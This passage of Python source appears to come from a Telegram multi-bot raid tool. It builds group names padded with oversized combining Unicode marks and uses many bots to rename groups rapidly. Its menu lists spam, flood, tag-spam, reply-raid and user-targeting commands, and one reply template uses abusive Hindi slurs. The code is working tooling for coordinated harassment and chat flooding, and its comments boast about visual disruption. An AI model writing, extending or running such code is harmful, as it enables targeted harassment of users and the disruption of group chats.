#    U+0489  ҉  Combining Cyrillic Millions Sign   → crossed circles around glyph
#    U+20DD  ⃝  Combining Enclosing Circle          → outer enclosing ring
#    U+20DF  ⃟  Combining Enclosing Diamond         → diamond frame
#    U+20DE  ⃞  Combining Enclosing Square          → square frame
#    U+0336  ̶  Combining Long Strikethrough        → diagonal slash
#
#  Result: 82 tiny codepoints render as 82 MASSIVE decorated glyphs that fill
#  the entire group-name field.  Visually looks like 3× more content than plain.
# ──────────────────────────────────────────────────────────────────────────────

def _elite_fill(prefix: str, unit: str, limit: int = 246) -> str:
    """Pad prefix with repeating unit up to limit codepoints, then truncate."""
    p = prefix[:limit]
    rem = limit - len(p)
    if rem >= len(unit):
        n   = rem // len(unit)
        ext = rem - n * len(unit)
        p   = (p + unit * n + unit[:ext])[:limit]
    return p

# ─── 1. SHARINGAN ─────────────────────────────────────────────────────────────
# Base: ꙮ  (Cyrillic Multiocular O = multi-eye glyph, literally Sharingan)
# Unit: ꙮ҈҉  =  3 codepoints → renders as ꙮ encircled by TWO huge Cyrillic rings
#              In Telegram: each glyph looks like a giant double-ringed eye ●◉●
def _sharingan_factory(txt: str) -> callable:
    BASE  = "ꙮ"
    UNIT  = "ꙮ\u0488\u0489"          # 3 chars: base + giant-ring + crossed-rings
    WORDS = ["𝐒𝐇𝐀𝐑𝐈𝐍𝐆𝐀𝐍","𝐌𝐀𝐍𝐆𝐄𝐊𝐘𝐎𝐔","𝐔𝐂𝐇𝐈𝐇𝐀","𝐀𝐌𝐀𝐓𝐄𝐑𝐀𝐒𝐔","𝐑𝐈𝐍𝐍𝐄𝐆𝐀𝐍","𝐓𝐒𝐔𝐊𝐔𝐘𝐎𝐌𝐈"]
    BURST = ["👁","🌀","🔴","💥","🌑","⭕"]
    ctr   = [0]; widx = [0]; bidx = [0]

    def _f() -> str:
        c    = ctr[0];  ctr[0]  += 1
        word = WORDS[widx[0] % len(WORDS)];  widx[0] += 1
        burst = BURST[bidx[0] % len(BURST)]; bidx[0] += 1
        tag  = _ELITE_TAIL[c % len(_ELITE_TAIL)]
        # 8 decorated units · burst · txt · word · burst · fill to 246
        prefix = f"{UNIT*8}{burst}{txt} {word} {burst}"
        core   = _elite_fill(prefix, UNIT)
        return f"{core} {tag}"
    return _f

# ─── 2. AKATSUKI ──────────────────────────────────────────────────────────────
# Base: 𑁍  (Brahmi ornament = Akatsuki cloud emblem)
# Unit: 𑁍҈⃝  =  3 codepoints → renders as 𑁍 inside a GIANT ring inside a CIRCLE
#              In Telegram: each glyph looks like a thick cloud halo ◯𑁍◯
def _akatsuki_factory(txt: str) -> callable:
    BASE  = "𑁍"
    UNIT  = "𑁍\u0488\u20dd"          # 3 chars: base + giant-ring + enclosing-circle
    WORDS = ["𝐀𝐊𝐀𝐓𝐒𝐔𝐊𝐈","𝐏𝐀𝐈𝐍","𝐍𝐀𝐆𝐀𝐓𝐎","𝐊𝐎𝐍𝐀𝐍","𝐎𝐁𝐈𝐓𝐎","𝐈𝐓𝐀𝐂𝐇𝐈","𝐄𝐕𝐀"]
    BURST = ["☁","🌩","⚡","🩸","💀","🌑"]
    ctr   = [0]; widx = [0]; bidx = [0]

    def _f() -> str:
        c    = ctr[0]; ctr[0]  += 1
        word = WORDS[widx[0] % len(WORDS)]; widx[0] += 1
        burst = BURST[bidx[0] % len(BURST)]; bidx[0] += 1
        tag  = _ELITE_TAIL[c % len(_ELITE_TAIL)]
        # cloud wrap · txt · word · cloud fill
        prefix = f"{UNIT*6}{burst}{txt} {word} {burst}{UNIT*4}"
        core   = _elite_fill(prefix, UNIT)
        return f"{core} {tag}"
    return _f

# ─── 3. MADARA ────────────────────────────────────────────────────────────────
# Base: 𒊹  (Sumerian star = Madara's divine power)
# Unit: 𒊹҉⃟  =  3 codepoints → renders as 𒊹 inside CROSSED CIRCLES + DIAMOND
#              In Telegram: looks like a divine star trapped inside armour ◈
def _madara_factory(txt: str) -> callable:
    BASE  = "𒊹"
    UNIT  = "𒊹\u0489\u20df"          # 3 chars: base + crossed-rings + enclosing-diamond
    WORDS = ["𝐌𝐀𝐃𝐀𝐑𝐀","𝐔𝐂𝐇𝐈𝐇𝐀","𝐆𝐎𝐃","𝐋𝐈𝐌𝐁𝐎","𝐑𝐈𝐍𝐍𝐄𝐆𝐀𝐍","𝐄𝐕𝐀"]
    BURST = ["⭐","👑","🌟","💫","☄","🔱"]
    ctr   = [0]; widx = [0]; bidx = [0]

    def _f() -> str:
        c    = ctr[0]; ctr[0]  += 1
        word = WORDS[widx[0] % len(WORDS)]; widx[0] += 1
        burst = BURST[bidx[0] % len(BURST)]; bidx[0] += 1
        tag  = _ELITE_TAIL[c % len(_ELITE_TAIL)]
        # symmetric divine arrangement: fill · burst · txt · word · burst · fill
        prefix = f"{UNIT*7}{burst} {txt} {word} {burst}{UNIT*5}"
        core   = _elite_fill(prefix, UNIT)
        return f"{core} {tag}"
    return _f

# ─── 4. SUSANOO ───────────────────────────────────────────────────────────────
# Base: ᯼  (Tai Tham = heavy slab glyph like armour plate)
# Unit: ᯼҈⃞  =  3 codepoints → renders as ᯼ inside GIANT RING + ENCLOSING SQUARE
#              In Telegram: looks like armour tiles in a square frame ▣▣▣
def _susanoo_factory(txt: str) -> callable:
    BASE  = "᯼"
    UNIT  = "᯼\u0488\u20de"          # 3 chars: base + giant-ring + enclosing-square
    WRAP  = ("꧁", "꧂")
    WORDS = ["𝐒𝐔𝐒𝐀𝐍𝐎𝐎","𝐏𝐄𝐑𝐅𝐄𝐂𝐓","𝐀𝐑𝐌𝐎𝐑","𝐃𝐈𝐕𝐈𝐍𝐄","𝐔𝐂𝐇𝐈𝐇𝐀","𝐄𝐕𝐀"]
    BURST = ["⚔","🛡","⚡","🔱","💥","🗡"]
    ctr   = [0]; widx = [0]; bidx = [0]

    def _f() -> str:
        c    = ctr[0]; ctr[0]  += 1
        word = WORDS[widx[0] % len(WORDS)]; widx[0] += 1
        burst = BURST[bidx[0] % len(BURST)]; bidx[0] += 1
        tag  = _ELITE_TAIL[c % len(_ELITE_TAIL)]
        # iconic ꧁ARMOR꧂ wrap + decorated tile fill
        prefix = f"{WRAP[0]}{UNIT*5}{burst}{txt} {word} {burst}{UNIT*4}{WRAP[1]}"
        core   = _elite_fill(prefix, UNIT)
        return f"{core} {tag}"
    return _f

# ─── 5. ITACHI ────────────────────────────────────────────────────────────────
# Base: ᙬ  (Canadian Syllabics = crow-claw mark)
# Unit: ᙬ҉̶  =  3 codepoints → renders as ᙬ inside CROSSED CIRCLES + STRIKETHROUGH
#              In Telegram: looks like dark crossed crows ✗᙭✗
def _itachi_factory(txt: str) -> callable:
    BASE  = "ᙬ"
    UNIT  = "ᙬ\u0489\u0336"          # 3 chars: base + crossed-rings + long-strikethrough
    WORDS = ["𝐈𝐓𝐀𝐂𝐇𝐈","𝐓𝐒𝐔𝐊𝐔𝐘𝐎𝐌𝐈","𝐀𝐌𝐀𝐓𝐄𝐑𝐀𝐒𝐔","𝐂𝐑𝐎𝐖","𝐆𝐄𝐍𝐉𝐔𝐓𝐒𝐔","𝐄𝐕𝐀"]
    BURST = ["🪶","🌑","💀","🦅","🖤","⚫"]
    ctr   = [0]; widx = [0]; bidx = [0]

    def _f() -> str:
        c    = ctr[0]; ctr[0]  += 1
        word = WORDS[widx[0] % len(WORDS)]; widx[0] += 1
        burst = BURST[bidx[0] % len(BURST)]; bidx[0] += 1
        tag  = _ELITE_TAIL[c % len(_ELITE_TAIL)]
        # pure darkness: crow-flood, burst centre, txt+word buried, fill with night
        prefix = f"{UNIT*10}{burst}{txt} {word}{burst}{UNIT*6}"
        core   = _elite_fill(prefix, UNIT)
        return f"{core} {tag}"
    return _f

# ═══════════════════════════════════════════════════════════════════════════════
#  ⚡  EVA LEGEND NCs  ⚡
#  5 exclusive signature commands — max power, unique symbols, 0.09s delay
#  Commands: -uchiha · -chidori · -amaterasu · -kirin · -cursemark
# ═══════════════════════════════════════════════════════════════════════════════

# ─── L1. UCHIHA ───────────────────────────────────────────────────────────────
# Base: ꙭ  (Cyrillic Multiocular O — multiple joined eyes = Sharingan clan crest)
# Unit: ꙭ҈⃝  =  giant ring enclosing the multi-eye glyph = clan seal
def _uchiha_factory(txt: str) -> callable:
    UNIT  = "ꙭ\u0488\u20dd"
    WORDS = ["𝐔𝐂𝐇𝐈𝐇𝐀","𝐄𝐕𝐀","𝐎𝐁𝐈𝐓𝐎","𝐅𝐔𝐆𝐀𝐊𝐔","𝐌𝐈𝐊𝐎𝐓𝐎","𝐂𝐋𝐀𝐍"]
    BURST = ["👁","🔴","⚔️","💀","🌑","🩸"]
    ctr   = [0]; widx = [0]; bidx = [0]

    def _f() -> str:
        c     = ctr[0]; ctr[0]  += 1
        word  = WORDS[widx[0] % len(WORDS)]; widx[0] += 1
        burst = BURST[bidx[0] % len(BURST)]; bidx[0] += 1
        tag   = _ELITE_TAIL[c % len(_ELITE_TAIL)]
        prefix = f"{UNIT*6}{burst}{txt} {word} {burst}{UNIT*5}"
        core   = _elite_fill(prefix, UNIT)
        return f"{core} {tag}"
    return _f

# ─── L2. CHIDORI ──────────────────────────────────────────────────────────────
# Base: ᛠ  (Anglo-Saxon ēar rune — crackle like a lightning bolt)
# Unit: ᛠ҈⃟  =  rune inside giant ring + diamond = chirping death blade
def _chidori_factory(txt: str) -> callable:
    UNIT  = "ᛠ\u0488\u20df"
    WORDS = ["𝐂𝐇𝐈𝐃𝐎𝐑𝐈","𝐋𝐈𝐆𝐇𝐓𝐍𝐈𝐍𝐆","𝐁𝐋𝐀𝐃𝐄","𝐊𝐈𝐑𝐈𝐍","𝐓𝐇𝐔𝐍𝐃𝐄𝐑","𝐄𝐕𝐀"]
    BURST = ["⚡","🔵","💙","🌩️","⚡","🔱"]
    ctr   = [0]; widx = [0]; bidx = [0]

    def _f() -> str:
        c     = ctr[0]; ctr[0]  += 1
        word  = WORDS[widx[0] % len(WORDS)]; widx[0] += 1
        burst = BURST[bidx[0] % len(BURST)]; bidx[0] += 1
        tag   = _ELITE_TAIL[c % len(_ELITE_TAIL)]
        prefix = f"{burst}{UNIT*8}{txt} {word} {UNIT*6}{burst}"
        core   = _elite_fill(prefix, UNIT)
        return f"{core} {tag}"
    return _f

# ─── L3. AMATERASU ────────────────────────────────────────────────────────────
# Base: ꫫ  (Lisu THA — solid dark block like black undying flame)
# Unit: ꫫ҉⃞  =  crossed-circles + enclosing square = eternal black fire
def _amaterasu_factory(txt: str) -> callable:
    UNIT  = "ꫫ\u0489\u20de"
    WORDS = ["𝐀𝐌𝐀𝐓𝐄𝐑𝐀𝐒𝐔","𝐅𝐋𝐀𝐌𝐄𝐒","𝐁𝐋𝐀𝐂𝐊","𝐄𝐓𝐄𝐑𝐍𝐀𝐋","𝐔𝐂𝐇𝐈𝐇𝐀","𝐄𝐕𝐀"]
    BURST = ["🔥","⚫","🖤","☄️","🌑","💀"]
    ctr   = [0]; widx = [0]; bidx = [0]

    def _f() -> str:
        c     = ctr[0]; ctr[0]  += 1
        word  = WORDS[widx[0] % len(WORDS)]; widx[0] += 1
        burst = BURST[bidx[0] % len(BURST)]; bidx[0] += 1
        tag   = _ELITE_TAIL[c % len(_ELITE_TAIL)]
        prefix = f"{UNIT*9}{burst} {txt} {word} {burst}{UNIT*7}"
        core   = _elite_fill(prefix, UNIT)
        return f"{core} {tag}"
    return _f

# ─── L4. KIRIN ────────────────────────────────────────────────────────────────
# Base: ᙘ  (Canadian Syllabics — angular shard like a lightning dragon scale)
# Unit: ᙘ҈⃝  =  shard inside giant ring + circle = divine storm dragon
def _kirin_factory(txt: str) -> callable:
    UNIT  = "ᙘ\u0488\u20dd"
    WORDS = ["𝐊𝐈𝐑𝐈𝐍","𝐃𝐑𝐀𝐆𝐎𝐍","𝐒𝐓𝐎𝐑𝐌","𝐃𝐈𝐕𝐈𝐍𝐄","𝐓𝐇𝐔𝐍𝐃𝐄𝐑","𝐄𝐕𝐀"]
    BURST = ["🐉","⚡","🌩️","🔱","☄️","💥"]
    ctr   = [0]; widx = [0]; bidx = [0]

    def _f() -> str:
        c     = ctr[0]; ctr[0]  += 1
        word  = WORDS[widx[0] % len(WORDS)]; widx[0] += 1
        burst = BURST[bidx[0] % len(BURST)]; bidx[0] += 1
        tag   = _ELITE_TAIL[c % len(_ELITE_TAIL)]
        prefix = f"꧁{UNIT*7}{burst}{txt} {word}{burst}{UNIT*5}꧂"
        core   = _elite_fill(prefix, UNIT)
        return f"{core} {tag}"
    return _f

# ─── L5. CURSEMARK ────────────────────────────────────────────────────────────
# Base: ꩤ  (Cham HA — coiling serpent stroke = cursed seal of heaven)
# Unit: ꩤ҉̶  =  crossed-circles + long-strikethrough = Orochimaru's mark
def _cursemark_factory(txt: str) -> callable:
    UNIT  = "ꩤ\u0489\u0336"
    WORDS = ["𝐂𝐔𝐑𝐒𝐄","𝐒𝐄𝐀𝐋","𝐃𝐀𝐑𝐊𝐍𝐄𝐒𝐒","𝐏𝐎𝐖𝐄𝐑","𝐎𝐑𝐎𝐂𝐇𝐈","𝐄𝐕𝐀"]
    BURST = ["🐍","💀","☠️","🌑","⚫","🩸"]
    ctr   = [0]; widx = [0]; bidx = [0]

    def _f() -> str:
        c     = ctr[0]; ctr[0]  += 1
        word  = WORDS[widx[0] % len(WORDS)]; widx[0] += 1
        burst = BURST[bidx[0] % len(BURST)]; bidx[0] += 1
        tag   = _ELITE_TAIL[c % len(_ELITE_TAIL)]
        prefix = f"{UNIT*11}{burst}{txt} {word}{burst}{UNIT*7}"
        core   = _elite_fill(prefix, UNIT)
        return f"{core} {tag}"
    return _f

async def _nc100_start(msg, chat_id: int, n: int, txt: str):
    """Start nc<n> with dedicated engine and per-NC delay."""
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return

    factory    = _nc100_factory(n, txt)
    engine_key = _nc100_engine_key(n)
    sym, *_    = _NC100_SPECS[n - 1]
    # Read override first, then per-NC default — mirrors global _gap() logic
    step = (_nc_gaps.get(f"nc{n}")
            or (_nc_send_gap if _nc_send_gap is not None else None)
            or _NC_DELAY_DEFAULTS.get(f"nc{n}", 0.12))
    label = f"NC{n} {sym*3}"

    _nc_info[chat_id] = {
        "engine": f"NC{n}", "text": txt, "start_t": time.monotonic()
    }

    async def _run(stop_ev):
        try:
            await _turbo_engine(chat_id, bots, stop_ev, factory)
        finally:
            _nc_info.pop(chat_id, None)

    await tc.start(chat_id, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚡ 𝐍𝐂{n} 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  📛 {txt}\n"
        f"  🎨 {label}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘌𝘯𝘨: {engine_key.upper()} · {step:.3f}𝘴\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

def _mgc_fire_factory(txt: str):
    last = _last()
    tmpl = [
        lambda t, s: f"🔥{t}🔥{s}",
        lambda t, s: f"⚡🔥{t}🔥⚡{s}",
        lambda t, s: f"🔥💀{t}💀🔥{s}",
        lambda t, s: f"🔥{t}𒐫💥{s}",
        lambda t, s: f"💥🔥{t}🔥💥{s}",
        lambda t, s: f"🔥⚡{t}⚡🔥{s}",
    ]
    def _f():
        fn = random.choice(tmpl)
        c  = fn(txt, rnd_suffix())[:255]
        if c == last[0]:
            c = fn(txt, rnd_suffix())[:255]
        last[0] = c
        return c
    return _f

def _mgc_war_factory(txt: str):
    last = _last()
    tmpl = [
        lambda t, s: f"⚔️{t}𒐫💥{s}",
        lambda t, s: f"⚔️💀{t}💀⚔️{s}",
        lambda t, s: f"🗡️{t}⚔️{s}",
        lambda t, s: f"⚔️⚡{t}⚡⚔️{s}",
        lambda t, s: f"💀⚔️{t}⚔️💀{s}",
        lambda t, s: f"🔱{t}⚔️{s}",
    ]
    def _f():
        fn = random.choice(tmpl)
        c  = fn(txt, rnd_suffix())[:255]
        if c == last[0]:
            c = fn(txt, rnd_suffix())[:255]
        last[0] = c
        return c
    return _f

def _mgc_surge_factory(txt: str):
    bold = txt.translate(_BOLD_MAP)
    last = _last()
    tmpl = [
        lambda t, s: f"⚡𝐒𝐔𝐑𝐆𝐄 {t}{s}",
        lambda t, s: f"💎{t}💎{s}",
        lambda t, s: f"🌊{t}🌊{s}",
        lambda t, s: f"♛{t}♛{s}",
        lambda t, s: f"👑{t}👑{s}",
        lambda t, s: f"🔱{t}🔱{s}",
    ]
    def _f():
        fn = random.choice(tmpl)
        c  = fn(bold, rnd_suffix())[:255]
        if c == last[0]:
            c = fn(bold, rnd_suffix())[:255]
        last[0] = c
        return c
    return _f


_MENU = """
╔╦══════════════════════════════╦╗
║║   ⚡ 𝐄ᴠᴀ 𝐁ʜᴀɢᴡᴀᴀɴ  ⚡   ║║
║║           𝐁ʏ 𝐄ᴠᴀ 𝐊ɪɴɢ           ║║
╚╩══════════════════════════════╩╝

𝐓ʏᴘᴇ -𝐌ᴇɴᴜ <𝐍ᴜᴍʙᴇʀ> 𝐓ᴏ 𝐎ᴘᴇɴ 𝐀 𝐒ᴇᴄᴛɪᴏɴ:

  𝟏  🔥 𝐍ᴄ 𝐂ᴏᴍᴍᴀɴᴅs
  𝟐  🔧 𝐄ɴɢɪɴᴇs
  𝟑  💥 𝐂ʜᴜᴅ 𝐍ᴄ (𝐁ᴇsᴛ)
  𝟒  🎯 𝐓ᴀʀɢᴇᴛ 𝐒ʏsᴛᴇᴍ
  𝟓  🖼️ 𝐆ᴄ 𝐏ғᴘ 𝐋ᴏᴏᴘ
  𝟔  🏛️ 𝐆ᴄ 𝐌ᴀɴᴀɢᴇᴍᴇɴᴛ
  𝟕  💬 𝐒ᴘᴀᴍ & 𝐒ʟɪᴅᴇ
  𝟖  ⚡ 𝐒ᴘᴀᴍ 𝐌ᴏᴅᴇ
  𝟗  🔁 𝐅ʟᴏᴏᴅ & 𝐓ᴀɢ
 𝟏𝟎  ⚔️ 𝐑ᴇᴘʟʏ 𝐑ᴀɪᴅ (𝐑ʀ)
 𝟏𝟏  🎨 𝐂ᴜsᴛᴏᴍ 𝐓ᴇᴍᴘʟᴀᴛᴇs
 𝟏𝟐  🗑️ 𝐏ᴜʀɢᴇ
 𝟏𝟑  ⚔️ 𝐖ᴀʀ 𝐂ᴏɴᴛʀᴏʟ
 𝟏𝟒  ⚡ 𝐄ᴠᴀ 𝐍ᴄ's
 𝟏𝟓  🌀 𝐑ᴀɴᴅᴏᴍ 𝐂ᴏᴅ 𝐍ᴄ
 𝟏𝟔  🎭 𝐅ʀɪᴇɴᴅs 𝐍ᴄ's
 𝟏𝟕  🤖 𝐁ᴏᴛ 𝐂ᴏɴᴛʀᴏʟ
 𝟏𝟖  🔐 𝐒ᴜᴅᴏ
 𝟏𝟗  🎵 𝐒ᴏɴɢ & 📞 𝐕ᴏɪᴄᴇ 𝐂ᴀʟʟ
 𝟐𝟎  🛠 𝐓ᴏᴏʟs
 𝟐𝟏  🌐 𝐌ᴜʟᴛɪ 𝐆ᴄ 𝐍ᴄ
 𝟐𝟐  🎯 𝐍ᴄ𝟏–𝐍ᴄ𝟏𝟏𝟓 (𝐔ɴɪǫᴜᴇ)
 𝟐𝟑  ⚡ 𝐄ᴠᴀ 𝐋ᴇɢᴇɴᴅ 𝐍ᴄ's ✨𝐍ᴇᴡ

╔════════════════════════════════╗
║  𝐏ʀᴇғɪx: - (𝐌ɪɴᴜs)         ║
║  𝐁ᴏᴛ: 10 𝐀ᴄᴛɪᴠᴇ ! 14 𝐌ᴀx  ║
╚════════════════════════════════╝""".strip()

_MENU_SECTIONS = [
    # 1 — NC Commands
    ("┌────── 🔥 𝐍ᴄ 𝐂ᴏᴍᴍᴀɴᴅs ──────┐\n"
     "│ -ɴᴄ <ᴛ>      𝐁ᴀsɪᴄ 𝐍ᴄ      │\n"
     "│ -sɴᴄ <ᴛ>     ⚡ 𝐒ᴜʀɢᴇ 𝐍ᴄ   │\n"
     "│ -ɢᴏᴅ <ᴛ>  👑 𝐆ᴏᴅ 𝐍ᴄ    │\n"
     "│ -ᴇᴠᴀɢᴏᴅ <ᴛ> 🗡️ 𝐄ᴠᴀ 𝐍ᴄ  │\n"
     "│ -ᴇᴠᴀ1 <ᴛ>  ⚡ 𝐒ᴛᴀɢɢᴇʀ   │\n"
     "│ -ᴛʀɪᴏɢᴏᴅ <ᴛ>  🔱 𝟑·𝟑·𝟒      │\n"
     "│ -sɪʟᴋɴᴄ <ᴛ>   🪡 𝐒ɪʟᴋ 𝐍ᴄ    │\n"
     "│ -ᴄʜᴜᴅ <ᴛ>     💥 𝐁ᴇsᴛ 𝐍ᴄ    │\n"
     "│ -ʙᴏʟᴅɴᴄ <ᴛ>   𝐁ᴏʟᴅ 𝐍𝐜      │\n"
     "│ -ᴄᴜʀsɪᴠᴇɴᴄ <ᴛ> 𝐂ᴜʀsɪᴠᴇ 𝐍ᴄ │\n"
     "│ -ɪᴛᴀʟɪᴄɴᴄ <ᴛ> 𝐈ᴛᴀʟɪᴄ 𝐍ᴄ    │\n"
     "│ -ᴡᴀᴠᴇɴᴄ <ᴛ>   𝐖ᴀᴠᴇ 𝐍ᴄ      │\n"
     "│ -ᴅᴇᴀᴅɴᴄ <ᴛ>  𝐃ᴇᴀᴅ 𝐍ᴄ      │\n"
     "│ -ɴɴᴄ <ᴛ> 𝐍ᴏ ɴᴀᴍᴇ 𝐍ᴄ  │\n"
     "│ -sᴇᴛᴅᴇʟᴀʏ <s> 𝐒ᴇᴛ 𝐃ᴇʟᴀʏ   │\n"
     "│ -sᴛᴏᴘ         𝐒ᴛᴏᴘ 𝐀ʟʟ      │\n"
     "└───────────────────────────────┘"),
    # 2 — Engines
    ("┌────── 🔧 𝐄ɴɢɪɴᴇs ────────────┐\n"
     "│ -ᴘʜᴀɴᴛᴏᴍ <ᴛ>  𝐙ᴇʀᴏ-𝐣ɪᴛᴛᴇʀ  │\n"
     "│ -ᴛᴇsᴛᴀᴍᴇɴᴛ <ᴛ> 𝐌ᴀx 𝐒ᴘᴇᴇᴅ  │\n"
     "│ -sʜᴀᴅᴏᴡ <ᴛ>   𝐓ʀɪᴏ 𝐒ᴛᴀɢɢᴇʀ │\n"
     "│ 𝐒ᴇᴛ 𝐁ᴇғᴏʀᴇ 𝐍ᴄ 𝐂ᴏᴍᴍᴀɴᴅ      │\n"
     "└───────────────────────────────┘"),
    # 3 — Chud NC
    ("┌────── 💥 𝐂ʜᴜᴅ 𝐍ᴄ (𝐁ᴇsᴛ) ─────┐\n"
     "│ -ᴄʜᴜᴅ <ᴛxᴛ>                   │\n"
     "│ 𝐓ᴇᴍᴘ: [ᴄʜᴜᴅ {ᴛ}𒐫💥{𝐖}]       │\n"
     "│ 𝐖ᴏʀᴅs: 𝐋ᴜɴᴅ 𝐓ʙᴋᴄ 𝐓ʙʀ 𝐓ᴍʀ     │\n"
     "│   𝐀ᴀʀᴇʏ चुदोड़े 𝐁ʜᴇɴ 𝐂ʜᴜᴅᴀʟᴇ  │\n"
     "│ 𝐏ɪᴘᴇʟɪɴᴇ · 𝐙ᴇʀᴏ-𝐉ɪᴛᴛᴇʀ     │\n"
     "└───────────────────────────────┘"),
    # 4 — Target System
    ("┌────── 🎯 𝐓ᴀʀɢᴇᴛ 𝐒ʏsᴛᴇᴍ ──────┐\n"
     "│ -ᴛᴀʀɢᴇᴛsʟɪᴅᴇ <ᴜɪᴅ>            │\n"
     "│  ᴛᴀʀɢᴇᴛ ᴍsɢ → 𝐁ᴜʀsᴛ 𝐒ʟɪᴅᴇ  │\n"
     "│ -sᴛᴏᴘᴛᴀʀɢᴇᴛsʟɪᴅᴇ              │\n"
     "│ -ᴛᴀʀɢᴇᴛʀᴇᴘʟʏ <ᴜɪᴅ> <𝐭>      │\n"
     "│  ᴛᴀʀɢᴇᴛ ᴍsɢ → 𝐀ᴜᴛᴏ 𝐑ᴇᴘʟʏ   │\n"
     "│ -sᴛᴏᴘᴛᴀʀɢᴇᴛʀᴇᴘʟʏ              │\n"
     "└───────────────────────────────┘"),
    # 5 — GC PFP Loop
    ("┌────── 🖼️ 𝐆ᴄ 𝐏ғᴘ 𝐋ᴏᴏᴘ ────────┐\n"
     "│ -ᴀᴅᴅᴘғᴘ    𝐑ᴇᴘʟʏ 𝐓ᴏ 𝐏ʜᴏᴛᴏ    │\n"
     "│ -ᴘғᴘʟᴏᴏᴘ <sᴇᴄ> 𝐒ᴛᴀʀᴛ 𝐋ᴏᴏᴘ   │\n"
     "│ -sᴛᴏᴘᴘғᴘʟᴏᴏᴘ 𝐒ᴛᴏᴘ           │\n"
     "│ -sᴇᴛᴘғᴘᴏɴᴄᴇ  𝐆ᴄ 𝐏ʜᴏᴛᴏ 1x    │\n"
     "│ -ᴅᴇʟᴇᴛᴇɢᴄᴘ??ᴘ 𝐑ᴇᴍᴏᴠᴇ 𝐏ʜᴏᴛᴏ  │\n"
     "│ -ᴘғᴘᴘᴏᴏʟ   𝐒ʜᴏᴡ 𝐏ᴏᴏʟ 𝐒ɪᴢᴇ   │\n"
     "│ -ᴄʟᴇᴀʀᴘғᴘ  𝐂ʟᴇᴀʀ 𝐏ᴏᴏʟ       │\n"
     "└───────────────────────────────┘"),
    # 6 — GC Management
    ("┌────── 🏛️ 𝐆ᴄ 𝐌ᴀɴᴀɢᴇᴍᴇɴᴛ ─────┐\n"
     "│ -ɢᴄɪɴғᴏ       𝐆ʀᴏᴜᴘ 𝐈ɴғᴏ    │\n"
     "│ -sᴇᴛɢᴄᴛɪᴛᴀʟ <ᴛ> 𝐒ᴇᴛ 𝐓ɪᴛᴀʟ  │\n"
     "│ -sᴇᴛɢᴄᴅᴇsᴄ <ᴛ>  𝐒ᴇᴛ 𝐃ᴇsᴄ   │\n"
     "│ -ɢᴇᴛɪɴᴠɪᴛᴇ    𝐈ɴᴠɪᴛᴇ 𝐋ɪɴᴋ  │\n"
     "│ -ᴘɪɴᴍsɢ       𝐏ɪɴ 𝐑ᴇᴘʟɪᴇᴅ  │\n"
     "│ -ᴜɴᴘɪɴᴀʟʟ     𝐔ɴᴘɪɴ 𝐀ʟʟ    │\n"
     "│ -ᴋɪᴄᴋᴜsᴇʀ <ɪᴅ> 𝐊ɪᴄᴋ        │\n"
     "│ -ʙᴀɴᴛᴀʀɢᴇᴛ <ɪᴅ> 𝐁ᴀɴ        │\n"
     "│ -ᴜɴʙᴀɴᴜsᴇʀ <ɪᴅ> 𝐔ɴʙᴀɴ      │\n"
     "│ -ᴍᴜᴛᴇᴜsᴇʀ <ɪᴅ>  𝐌ᴜᴛᴇ       │\n"
     "│ -ᴜɴᴍᴜᴛᴇᴜsᴇʀ <ɪᴅ> 𝐔ɴᴍᴜᴛᴇ   │\n"
     "│ -ɢᴄʟᴇᴀᴠᴇ  🚪 𝐁ᴏᴛ's 𝐋ᴇᴀᴠᴇ 𝐆ᴄ │\n"
     "└───────────────────────────────┘"),
    # 7 — Spam & Slide
    ("┌────── 💬 𝐒ᴘᴀᴍ & 𝐒ʟɪᴅᴇ ───────┐\n"
     "│ -sᴘᴀᴍ <ᴛ>      𝐒ᴘᴀᴍ 𝐌sɢ     │\n"
     "│ -sᴛᴏᴘsᴘᴀᴍ      𝐒ᴛᴏᴘ          │\n"
     "│ -sʟɪᴅᴇsᴘᴀᴍ <ᴛ> 𝐒ʟɪᴅᴇ 𝐒ᴘᴀᴍ  │\n"
     "│ -sᴛᴏᴘsʟɪᴅᴇ     𝐒ᴛᴏᴘ          │\n"
     "│ -ᴀᴜᴛᴏʀᴇᴘʟʏ <ᴛ>  𝐀ᴜᴛᴏ 𝐑ᴇᴘʟʏ │\n"
     "│ -sᴛᴏᴘʀᴇᴘʟʏ      𝐒ᴛᴏᴘ          │\n"
     "│ -ʀᴇᴀᴄᴛ <ᴇ>      𝐀ᴜᴛᴏ 𝐑ᴇᴀᴄᴛ  │\n"
     "│ -sᴛᴏᴘʀᴇᴀᴄᴛ      𝐒ᴛᴏᴘ          │\n"
     "└───────────────────────────────┘"),
    # 8 — Spam Modes
    ("┌────── ⚡ 𝐒ᴘᴀᴍ 𝐌ᴏᴅᴇs ─────────┐\n"
     "│ -sᴡɪᴘᴇsᴘᴀᴍ <ᴛ> 🌊 [-ss]     │\n"
     "│  𝐒ᴛᴏᴘ: -sss                   │\n"
     "│ -ʙᴜʀsᴛsᴘᴀᴍ <ᴛ>[ɴ] 💥 [-ʙs]   │\n"
     "│  𝐈ɴsᴛᴀɴᴛ 𝐍 𝐌ᴇssᴀɢᴇs          │\n"
     "│ -ᴄʜᴜᴅsᴘᴀᴍ <ᴛ> [-ᴄs]          │\n"
     "│  𝐒ᴛᴏᴘ: -sᴄs                   │\n"
     "│ -ʀᴀᴘɪᴅғɪʀᴇ <ᴛ> ⚡ [-ʀᴀᴘ]      │\n"
     "│  𝐒ᴛᴏᴘ: -sʀᴀᴘ                  │\n"
     "│ -ᴄᴏᴘʏsᴘᴀᴍ <ᴛ>  𝐒ᴛᴏᴘ: -sᴛᴏᴘ  │\n"
     "└───────────────────────────────┘"),
    # 9 — Flood & Tag
    ("┌────── 🔁 𝐅ʟᴏᴏᴅ & 𝐓ᴀɢ ────────┐\n"
     "│ -ʀᴇᴘʟʏғʟᴏᴏᴅ <ᴛ> [-ʀғ]        │\n"
     "│  𝐒ᴛᴏᴘ: -sʀғ                   │\n"
     "│ -ᴛᴀɢsᴘᴀᴍ <ɪᴅ> <ᴛ> [-ᴛs]      │\n"
